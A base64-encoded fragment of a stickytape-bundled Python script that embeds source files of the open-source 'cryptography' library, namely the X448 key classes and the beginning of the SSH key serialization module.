ZXkuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHByaXZhdGVfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogX3NlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBfc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LFxyXG4gICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBfc2VyaWFsaXphdGlvbi5LZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbixcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHNlcmlhbGl6ZWQgYnl0ZXMgb2YgdGhlIHByaXZhdGUga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBleGNoYW5nZShzZWxmLCBwZWVyX3B1YmxpY19rZXk6IFgyNTUxOVB1YmxpY0tleSkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUGVyZm9ybXMgYSBrZXkgZXhjaGFuZ2Ugb3BlcmF0aW9uIHVzaW5nIHRoZSBwcm92aWRlZCBwZWVyXCdzIHB1YmxpYyBrZXkuXHJcbiAgICAgICAgIiIiXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMvYXN5bW1ldHJpYy94NDQ4LnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmltcG9ydCBhYmNcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IFVuc3VwcG9ydGVkQWxnb3JpdGhtLCBfUmVhc29uc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgX3NlcmlhbGl6YXRpb25cclxuXHJcblxyXG5jbGFzcyBYNDQ4UHVibGljS2V5KG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAY2xhc3NtZXRob2RcclxuICAgIGRlZiBmcm9tX3B1YmxpY19ieXRlcyhjbHMsIGRhdGE6IGJ5dGVzKSAtPiAiWDQ0OFB1YmxpY0tleSI6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgICAgICBpZiBub3QgYmFja2VuZC54NDQ4X3N1cHBvcnRlZCgpOlxyXG4gICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJYNDQ4IGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhpcyB2ZXJzaW9uIG9mIE9wZW5TU0wuIixcclxuICAgICAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX0VYQ0hBTkdFX0FMR09SSVRITSxcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gYmFja2VuZC54NDQ4X2xvYWRfcHVibGljX2J5dGVzKGRhdGEpXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBfc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IF9zZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHNlcmlhbGl6ZWQgYnl0ZXMgb2YgdGhlIHB1YmxpYyBrZXkuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuY2xhc3MgWDQ0OFByaXZhdGVLZXkobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGdlbmVyYXRlKGNscykgLT4gIlg0NDhQcml2YXRlS2V5IjpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kXHJcblxyXG4gICAgICAgIGlmIG5vdCBiYWNrZW5kLng0NDhfc3VwcG9ydGVkKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIlg0NDggaXMgbm90IHN1cHBvcnRlZCBieSB0aGlzIHZlcnNpb24gb2YgT3BlblNTTC4iLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfRVhDSEFOR0VfQUxHT1JJVEhNLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIGJhY2tlbmQueDQ0OF9nZW5lcmF0ZV9rZXkoKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGZyb21fcHJpdmF0ZV9ieXRlcyhjbHMsIGRhdGE6IGJ5dGVzKSAtPiAiWDQ0OFByaXZhdGVLZXkiOlxyXG4gICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcbiAgICAgICAgaWYgbm90IGJhY2tlbmQueDQ0OF9zdXBwb3J0ZWQoKTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAiWDQ0OCBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoaXMgdmVyc2lvbiBvZiBPcGVuU1NMLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9FWENIQU5HRV9BTEdPUklUSE0sXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIGJhY2tlbmQueDQ0OF9sb2FkX3ByaXZhdGVfYnl0ZXMoZGF0YSlcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBYNDQ4UHVibGljS2V5OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBzZXJpYWxpemVkIGJ5dGVzIG9mIHRoZSBwdWJsaWMga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwcml2YXRlX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IF9zZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogX3NlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdCxcclxuICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobTogX3NlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBzZXJpYWxpemVkIGJ5dGVzIG9mIHRoZSBwcml2YXRlIGtleS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZXhjaGFuZ2Uoc2VsZiwgcGVlcl9wdWJsaWNfa2V5OiBYNDQ4UHVibGljS2V5KSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBQZXJmb3JtcyBhIGtleSBleGNoYW5nZSBvcGVyYXRpb24gdXNpbmcgdGhlIHByb3ZpZGVkIHBlZXJcJ3MgcHVibGljIGtleS5cclxuICAgICAgICAiIiJcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9zZXJpYWxpemF0aW9uL3NzaC5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgYmluYXNjaWlcclxuaW1wb3J0IG9zXHJcbmltcG9ydCByZVxyXG5pbXBvcnQgdHlwaW5nXHJcbmZyb20gYmFzZTY0IGltcG9ydCBlbmNvZGVieXRlcyBhcyBfYmFzZTY0X2VuY29kZVxyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IFVuc3VwcG9ydGVkQWxnb3JpdGhtXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IGRzYSwgZWMsIGVkMjU1MTksIHJzYVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzIGltcG9ydCBDaXBoZXIsIGFsZ29yaXRobXMsIG1vZGVzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLnNlcmlhbGl6YXRpb24gaW1wb3J0IChcclxuICAgIEVuY29kaW5nLFxyXG4gICAgTm9FbmNyeXB0aW9uLFxyXG4gICAgUHJpdmF0ZUZvcm1hdCxcclxuICAgIFB1YmxpY0Zvcm1hdCxcclxuKVxyXG5cclxudHJ5OlxyXG4gICAgZnJvbSBiY3J5cHQgaW1wb3J0IGtkZiBhcyBfYmNyeXB0X2tkZlxyXG5cclxuICAgIF9iY3J5cHRfc3VwcG9ydGVkID0gVHJ1ZVxyXG5leGNlcHQgSW1wb3J0RXJyb3I6XHJcbiAgICBfYmNyeXB0X3N1cHBvcnRlZCA9IEZhbHNlXHJcblxyXG4gICAgZGVmIF9iY3J5cHRfa2RmKFxyXG4gICAgICAgIHBhc3N3b3JkOiBieXRlcyxcclxuICAgICAgICBzYWx0OiBieXRlcyxcclxuICAgICAgICBkZXNpcmVkX2tleV9ieXRlczogaW50LFxyXG4gICAgICAgIHJvdW5kczogaW50LFxyXG4gICAgICAgIGlnbm9yZV9mZXdfcm91bmRzOiBib29sID0gRmFsc2UsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKCJOZWVkIGJjcnlwdCBtb2R1bGUiKVxyXG5cclxuXHJcbl9TU0hfRUQyNTUxOSA9IGIic3NoLWVkMjU1MTkiXHJcbl9TU0hfUlNBID0gYiJzc2gtcnNhIlxyXG5fU1NIX0RTQSA9IGIic3NoLWRzcyJcclxuX0VDRFNBX05JU1RQMjU2ID0gYiJlY2RzYS1zaGEyLW5pc3RwMjU2IlxyXG5fRUNEU0FfTklTVFAzODQgPSBiImVjZHNhLXNoYTItbmlzdHAzODQiXHJcbl9FQ0RTQV9OSVNUUDUyMSA9IGIiZWNkc2Etc2hhMi1uaXN0cDUyMSJcclxuX0NFUlRfU1VGRklYID0gYiItY2VydC12MDFAb3BlbnNzaC5jb20iXHJcblxyXG5fU1NIX1BVQktFWV9SQyA9IHJlLmNvbXBpbGUocmIiXFxBKFxcUyspWyBcXHRdKyhcXFMrKSIpXHJcbl9TS19NQUdJQyA9IGIib3BlbnNzaC1rZXktdjFcXDAiXHJcbl9TS19TVEFSVCA9IGIiLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0iXHJcbl9TS19FTkQgPSBiIi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLSJcclxuX0JDUllQVCA9IGIiYmNyeXB0IlxyXG5fTk9ORSA9IGIibm9uZSJcclxuX0RFRkFVTFRfQ0lQSEVSID0gYiJhZXMyNTYtY3RyIlxyXG5fREVGQVVMVF9ST1VORFMgPSAxNlxyXG5fTUFYX1BBU1NXT1JEID0gNzJcclxuXHJcbiMgcmUgaXMgb25seSB3YXkgdG8gd29yayBvbiBieXRlcy1saWtlIGRhdGFcclxuX1BFTV9SQyA9IHJlLmNvbXBpbGUoX1NLX1NUQVJUICsgYiIoLio/KSIgKyBfU0tfRU5ELCByZS5ET1RBTEwpXHJcblxyXG4jIHBhZGRpbmcgZm9yIG1heCBibG9ja3NpemVcclxuX1BBRERJTkcgPSBtZW1vcnl2aWV3KGJ5dGVhcnJheShyYW5nZSgxLCAxICsgMTYpKSlcclxuXHJcbiMgY2lwaGVycyB0aGF0IGFyZSBhY3R1YWxseSB1c2VkIGluIGtleSB3cmFwcGluZ1xyXG5fU1NIX0NJUEhFUlM6IHR5cGluZy5EaWN0W1xyXG4gICAgYnl0ZXMsXHJcbiAgICB0eXBpbmcuVHVwbGVbXHJcbiAgICAgICAgdHlwaW5nLlR5cGVbYWxnb3JpdGhtcy5BRVNdLFxyXG4gICAgICAgIGludCxcclxuICAgICAgICB0eXBpbmcuVW5pb25bdHlwaW5nLlR5cGVbbW9kZXMuQ1RSXSwgdHlwaW5nLlR5cGVbbW9kZXMuQ0JDXV0sXHJcbiAgICAgICAgaW50LFxyXG4gICAgXSxcclxuXSA9IHtcclxuICAgIGIiYWVzMjU2LWN0ciI6IChhbGdvcml0aG1zLkFFUywgMzIsIG1vZGVzLkNUUiwgMTYpLFxyXG4gICAgYiJhZXMyNTYtY2JjIjogKGFsZ29yaXRobXMuQUVTLCAzMiwgbW9kZXMuQ0JDLCAxNiksXHJcbn1cclxuXHJcbiMgbWFwIGxvY2FsIGN1cnZlIG5hbWUgdG8ga2V5IHR5cGVcclxuX0VDRFNBX0tFWV9UWVBFID0ge1xyXG4gICAgInNlY3AyNTZyMSI6IF9FQ0RTQV9OSVNUUDI1NixcclxuICAgICJzZWNwMzg0cjEiOiBfRUNEU0FfTklTVFAzODQsXHJcbiAgICAic2VjcDUyMXIxIjogX0VDRFNBX05JU1RQNTIxLFxyXG59XHJcblxyXG5cclxuZGVmIF9lY2RzYV9rZXlfdHlwZShwdWJsaWNfa2V5OiBlYy5FbGxpcHRpY0N1cnZlUHVibGljS2V5KSAtPiBieXRlczpcclxuICAgICIiIlJldHVybiBTU0gga2V5X3R5cGUgYW5kIGN1cnZlX25hbWUgZm9yIHByaXZhdGUga2V5LiIiIlxyXG4gICAgY3VydmUgPSBwdWJsaWNfa2V5LmN1cnZlXHJcbiAgICBpZiBjdXJ2ZS5uYW1lIG5vdCBpbiBfRUNEU0FfS0VZX1RZUEU6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgZiJVbnN1cHBvcnRlZCBjdXJ2ZSBmb3Igc3NoIHByaXZhdGUga2V5OiB7Y3VydmUubmFtZSFyfSJcclxuICAgICAgICApXHJcbiAgICByZXR1cm4gX0VDRFNBX0tFWV9UWVBFW2N1cnZlLm5hbWVdXHJcblxyXG5cclxuZGVmIF9zc2hfcGVtX2VuY29kZShcclxuICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgcHJlZml4OiBieXRlcyA9IF9TS19TVEFSVCArIGIiXFxuIixcclxuICAgIHN1ZmZpeDogYnl0ZXMgPSBfU0tfRU5EICsgYiJcXG4iLFxyXG4pIC0+IGJ5dGVzOlxyXG4gICAgcmV0dXJuIGIiIi5qb2luKFtwcmVmaXgsIF9iYXNlNjRfZW5jb2RlKGRhdGEpLCBzdWZmaXhdKVxyXG5cclxuXHJcbmRlZiBfY2hlY2tfYmxvY2tfc2l6ZShkYXRhOiBieXRlcywgYmxvY2tfbGVuOiBpbnQpIC0+IE5vbmU6XHJcbiAgICAiIiJSZXF1aXJlIGRhdGEgdG8gYmUgZnVsbCBibG9ja3MiIiJcclxuICAgIGlmIG5vdCBkYXRhIG9yIGxlbihkYXRhKSAlIGJsb2NrX2xlbiAhPSAwOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNvcnJ1cHQgZGF0YTogbWlzc2luZyBwYWRkaW5nIilcclxuXHJcblxyXG5kZWYgX2NoZWNrX2VtcHR5KGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgIiIiQWxsIGRhdGEgc2hvdWxkIGhhdmUgYmVlbiBwYXJzZWQuIiIiXHJcbiAgICBpZiBkYXRhOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNvcnJ1cHQgZGF0YTogdW5wYXJzZWQgZGF0YSIpXHJcblxyXG5cclxuZGVmIF9pbml0X2NpcGhlcihcclxuICAgIGNpcGhlcm5hbWU6IGJ5dGVzLFxyXG4gICAgcGFzc3dvcmQ6IHR5cGluZy5PcHRpb25hbFtieXRlc10sXHJcbiAgICBzYWx0OiBieXRlcyxcclxuICAgIHJvdW5kczogaW50LFxyXG4pIC0+IENpcGhlclt0eXBpbmcuVW5pb25bbW9kZXMuQ0JDLCBtb2Rlcy5DVFJdXTpcclxuICAgICIiIkdlbmVyYXRlIGtleSArIGl2IGFuZCByZXR1cm4gY2lwaGVyLiIiIlxyXG4gICAgaWYgbm90IHBhc3N3b3JkOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIktleSBpcyBwYXNzd29yZC1wcm90ZWN0ZWQuIilcclxuXHJcbiAgICBhbGdvLCBrZXlfbGVuLCBtb2RlLCBpdl9sZW4gPSBfU1NIX0NJUEhFUlNbY2lwaGVybmFtZV1cclxuICAgIHNlZWQgPSBfYmNyeXB0X2tkZihwYXNzd29yZCwgc2FsdCwga2V5X2xlbiArIGl2X2xlbiwgcm91bmRzLCBUcnVlKVxyXG4gICAgcmV0dXJuIENpcGhlcihhbGdvKHNlZWRbOmtleV9sZW5dKSwgbW9kZShzZWVkW2tleV9sZW46XSkpXHJcblxyXG5cclxuZGVmIF9nZXRfdTMyKGRhdGE6IG1lbW9yeXZpZXcpIC0+IHR5cGluZy5UdXBsZVtpbnQsIG1lbW9yeXZpZXddOlxyXG4gICAgIiIiVWludDMyIiIiXHJcbiAgICBpZiBsZW4oZGF0YSkgPCA0OlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgZGF0YSIpXHJcbiAgICByZXR1cm4gaW50LmZyb21fYnl0ZXMoZGF0YVs6NF0sIGJ5dGVvcmRlcj0iYmlnIiksIGRhdGFbNDpdXHJcblxyXG5cclxuZGVmIF9nZXRfdTY0KGRhdGE6IG1lbW9yeXZpZXcpIC0+IHR5cGluZy5UdXBsZVtpbnQsIG1lbW9yeXZpZXddOlxyXG4gICAgIiIiVWludDY0IiIiXHJcbiAgICBpZiBsZW4oZGF0YSkgPCA4OlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgZGF0YSIpXHJcbiAgICByZXR1cm4gaW50LmZyb21fYnl0ZXMoZGF0YVs6OF0sIGJ5dGVvcmRlcj0iYmlnIiksIGRhdGFbODpdXHJcblxyXG5cclxuZGVmIF9nZXRfc3Noc3RyKGRhdGE6IG1lbW9yeXZpZXcpIC0+IHR5cGluZy5UdXBsZVttZW1vcnl2aWV3LCBtZW1vcnl2aWV3XTpcclxuICAgICIiIkJ5dGVzIHdpdGggdTMyIGxlbmd0aCBwcmVmaXgiIiJcclxuICAgIG4sIGRhdGEgPSBfZ2V0X3UzMihkYXRhKVxyXG4gICAgaWYgbiA+IGxlbihkYXRhKTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbnZhbGlkIGRhdGEiKVxyXG4gICAgcmV0dXJuIGRhdGFbOm5dLCBkYXRhW246XVxyXG5cclxuXHJcbmRlZiBfZ2V0X21waW50KGRhdGE6IG1lbW9yeXZpZXcpIC0+IHR5cGluZy5UdXBsZVtpbnQsIG1lbW9yeXZpZXddOlxyXG4gICAgIiIiQmlnIGludGVnZXIuIiIiXHJcbiAgICB2YWwsIGRhdGEgPSBfZ2V0X3NzaHN0cihkYXRhKVxyXG4gICAgaWYgdmFsIGFuZCB2YWxbMF0gPiAweDdGOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgZGF0YSIpXHJcbiAgICByZXR1cm4gaW50LmZyb21fYnl0ZXModmFsLCAiYmlnIiksIGRhdGFcclxuXHJcblxyXG5kZWYgX3RvX21waW50KHZhbDogaW50KSAtPiBieXRlczpcclxuICAgICIiIlN0b3JhZ2UgZm9ybWF0IGZvciBzaWduZWQgYmlnaW50LiIiIlxyXG4gICAgaWYgdmFsIDwgMDpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJuZWdhdGl2ZSBtcGludCBub3QgYWxsb3dlZCIpXHJcbiAgICBpZiBub3QgdmFsOlxyXG4gICAgICAgIHJldHVybiBiIiJcclxuICAgIG5ieXRlcyA9ICh2YWwuYml0X2xlbmd0aCgpICsgOCkgLy8gOFxyXG4gICAgcmV0dXJuIHV0aWxzLmludF90b19ieXRlcyh2YWwsIG5ieXRlcylcclxuXHJcblxyXG5jbGFzcyBfRnJhZ0xpc3Q6XHJcbiAgICAiIiJCdWlsZCByZWN1cnNpdmUgc3RydWN0dXJlIHdpdGhvdXQgZGF0YSBjb3B5LiIiIlxyXG5cclxuICAgIGZsaXN0OiB0eXBpbmcuTGlzdFtieXRlc11cclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgaW5pdDogdHlwaW5nLkxpc3RbYnl0ZXNdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmZsaXN0ID0gW11cclxuICAgICAgICBpZiBpbml0OlxyXG4gICAgICAgICAgICBzZWxmLmZsaXN0LmV4dGVuZChpbml0KVxyXG5cclxuICAgIGRlZiBwdXRfcmF3KHNlbGYsIHZhbDogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiQWRkIHBsYWluIGJ5dGVzIiIiXHJcbiAgICAgICAgc2VsZi5mbGlzdC5hcHBlbmQodmFsKVxyXG5cclxuICAgIGRlZiBwdXRfdTMyKHNlbGYsIHZhbDogaW50KSAtPiBOb25lOlxyXG4gICAgICAgICIiIkJpZy1lbmRpYW4gdWludDMyIiIiXHJcbiAgICAgICAgc2VsZi5mbGlzdC5hcHBlbmQodmFsLnRvX2J5dGVzKGxlbmd0aD00LCBieXRlb3JkZXI9ImJpZyIpKVxyXG5cclxuICAgIGRlZiBwdXRfc3Noc3RyKHNlbGYsIHZhbDogdHlwaW5nLlVuaW9uW2J5dGVzLCAiX0ZyYWdMaXN0Il0pIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiQnl0ZXMgcHJlZml4ZWQgd2l0aCB1MzIgbGVuZ3RoIiIiXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZSh2YWwsIChieXRlcywgbWVtb3J5dmlldywgYnl0ZWFycmF5KSk6XHJcbiAgICAgICAgICAgIHNlbGYucHV0X3UzMihsZW4odmFsKSlcclxuICAgICAgICAgICAgc2VsZi5mbGlzdC5hcHBlbmQodmFsKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYucHV0X3UzMih2YWwuc2l6ZSgpKVxyXG4gICAgICAgICAgICBzZWxmLmZsaXN0LmV4dGVuZCh2YWwuZmxpc3QpXHJcblxyXG4gICAgZGVmIHB1dF9tcGludChzZWxmLCB2YWw6IGludCkgLT4gTm9uZTpcclxuICAgICAgICAiIiJCaWctZW5kaWFuIGJpZ2ludCBwcmVmaXhlZCB3aXRoIHUzMiBsZW5ndGgiIiJcclxuICAgICAgICBzZWxmLnB1dF9zc2hzdHIoX3RvX21waW50KHZhbCkpXHJcblxyXG4gICAgZGVmIHNpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIkN1cnJlbnQgbnVtYmVyIG9mIGJ5dGVzIiIiXHJcbiAgICAgICAgcmV0dXJuIHN1bShtYXAobGVuLCBzZWxmLmZsaXN0KSlcclxuXHJcbiAgICBkZWYgcmVuZGVyKHNlbGYsIGRzdGJ1ZjogbWVtb3J5dmlldywgcG9zOiBpbnQgPSAwKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiV3JpdGUgaW50byBieXRlYXJyYXkiIiJcclxuICAgICAgICBmb3IgZnJhZyBpbiBzZWxmLmZsaXN0OlxyXG4gICAgICAgICAgICBmbGVuID0gbGVuKGZyYWcpXHJcbiAgICAgICAgICAgIHN0YXJ0LCBwb3MgPSBwb3MsIHBvcyArIGZsZW5cclxuICAgICAgICAgICAgZHN0YnVmW3N0YXJ0OnBvc10gPSBmcmFnXHJcbiAgICAgICAgcmV0dXJuIHBvc1xyXG5cclxuICAgIGRlZiB0b2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlJldHVybiBhcyBieXRlcyIiIlxyXG4gICAgICAgIGJ1ZiA9IG1lbW9yeXZpZXcoYnl0ZWFycmF5KHNlbGYuc2l6ZSgpKSlcclxuICAgICAgICBzZWxmLnJlbmRlcihidWYpXHJcbiAgICAgICAgcmV0dXJuIGJ1Zi50b2J5dGVzKClcclxuXHJcblxyXG5jbGFzcyBfU1NIRm9ybWF0UlNBOlxyXG4gICAgIiIiRm9ybWF0IGZvciBSU0Ega2V5cy5cclxuXHJcbiAgICBQdWJsaWM6XHJcbiAgICAgICAgbXBpbnQgZSwgblxyXG4gICAgUHJpdmF0ZTpcclxuICAgICAgICBtcGludCBuLCBlLCBkLCBpcW1wLCBwLCBxXHJcbiAgICAiIiJcclxuXHJcbiAgICBkZWYgZ2V0X3B1YmxpYyhzZWxmLCBkYXRhOiBtZW1vcnl2aWV3KTpcclxuICAgICAgICAiIiJSU0EgcHVibGljIGZpZWxkcyIiIlxyXG4gICAgICAgIGUsIGRhdGEgPSBfZ2V0X21waW50KGRhdGEpXHJcbiAgICAgICAgbiwgZGF0YSA9IF9nZXRfbXBpbnQoZGF0YSlcclxuICAgICAgICByZXR1cm4gKGUsIG4pLCBkYXRhXHJcblxyXG4gICAgZGVmIGxvYWRfcHVibGljKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IG1lbW9yeXZpZXdcclxuICAgICkgLT4gdHlwaW5nLlR1cGxlW3JzYS5SU0FQdWJsaWNLZXksIG1lbW9yeXZpZXddOlxyXG4gICAgICAgICIiIk1ha2UgUlNBIHB1YmxpYyBrZXkgZnJvbSBkYXRhLiIiIlxyXG4gICAgICAgIChlLCBuKSwgZGF0YSA9IHNlbGYuZ2V0X3B1YmxpYyhkYXRhKVxyXG4gICAgICAgIHB1YmxpY19udW1iZXJzID0gcnNhLlJTQVB1YmxpY051bWJlcnMoZSwgbilcclxuICAgICAgICBwdWJsaWNfa2V5ID0gcHVibGljX251bWJlcnMucHVibGljX2tleSgpXHJcbiAgICAgICAgcmV0dXJuIHB1YmxpY19rZXksIGRhdGFcclxuXHJcbiAgICBkZWYgbG9hZF9wcml2YXRlKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IG1lbW9yeXZpZXcsIHB1YmZpZWxkc1xyXG4gICAgKSAtPiB0eXBpbmcuVHVwbGVbcnNhLlJTQVByaXZhdGVLZXksIG1lbW9yeXZpZXddOlxyXG4gICAgICAgICIiIk1ha2UgUlNBIHByaXZhdGUga2V5IGZyb20gZGF0YS4iIiJcclxuICAgICAgICBuLCBkYXRhID0gX2dldF9tcGludChkYXRhKVxyXG4gICAgICAgIGUsIGRhdGEgPSBfZ2V0X21waW50KGRhdGEpXHJcbiAgICAgICAgZCwgZGF0YSA9IF9nZXRfbXBpbnQoZGF0YSlcclxuICAgICAgICBpcW1wLCBkYXRhID0gX2dldF9tcGludChkYXRhKVxyXG4gICAgICAgIHAsIGRhdGEgPSBfZ2V0X21waW50KGRhdGEpXHJcbiAgICAgICAgcSwgZGF0YSA9IF9nZXRfbXBpbnQoZGF0YSlcclxuXHJcbiAgICAgICAgaWYgKGUsIG4pICE9IHB1YmZpZWxkczpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQ29ycnVwdCBkYXRhOiByc2EgZmllbGQgbWlzbWF0Y2giKVxyXG4gICAgICAgIGRtcDEgPSByc2EucnNhX2NydF9kbXAxKGQsIHApXHJcbiAgICAgICAgZG1xMSA9IHJzYS5yc2FfY3J0X2RtcTEoZCwgcSlcclxuICAgICAgICBwdWJsaWNfbnVtYmVycyA9IHJzYS5SU0FQdWJsaWNOdW1iZXJzKGUsIG4pXHJcbiAgICAgICAgcHJpdmF0ZV9udW1iZXJzID0gcnNhLlJTQVByaXZhdGVOdW1iZXJzKFxyXG4gICAgICAgICAgICBwLCBxLCBkLCBkbXAxLCBkbX